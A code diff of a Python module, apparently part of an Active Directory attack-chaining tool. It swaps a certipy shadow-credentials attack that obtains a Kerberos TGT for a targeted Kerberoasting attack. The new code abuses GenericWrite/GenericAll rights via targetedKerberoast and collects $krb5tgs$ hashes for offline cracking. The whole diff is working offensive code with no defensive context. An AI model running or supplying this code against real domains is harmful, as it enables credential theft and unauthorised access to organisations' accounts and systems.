@@ -1,10 +1,9 @@
 import subprocess
-from pathlib import Path
 
 def run(data, cred, args):
     """
-    Abuse shadow credentials to get TGT via certipy.
-    Returns the path to the ccache file if successful.
+    Abuse GenericWrite/GenericAll to perform targeted Kerberoasting.
+    Returns a list of extracted hashes.
     """
     extra = getattr(args, "extra", []) or []
     if len(extra) < 1:
@@ -27,26 +26,26 @@ def run(data, cred, args):
         return None
 
     cmd = [
-        "certipy", "shadow", "auto",
-        "-u", f"{username}@{domain}",
+        "targetedKerberoast",
+        "-d", domain,
+        "-u", username,
         "-p", password,
-        "-account", target_user,
-        "-dc-ip", ip, 
-        "-ldap-scheme", "ldap"
+        "--dc-ip", ip,
     ]
 
     print(f"[*] Running: {' '.join(cmd)}")
 
     try:
-        subprocess.run(cmd)
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        output = result.stdout + result.stderr
+        
+        hashes = []
+        for line in output.splitlines():
+            if "$krb5tgs$" in line:
+                hashes.append(line.strip())
+        
+        return hashes if hashes else None
+
     except Exception as e:
         print(f"[-] Execution failed: {e}")
         return None
-
-    ccache_file = Path(f"{target_user}.ccache")
-    if ccache_file.exists():
-        print(f"[+] Got TGT: {ccache_file}")
-        # Return the path so the CHAIN can decide what to do with it
-        return str(ccache_file.absolute())
-    
-    return None
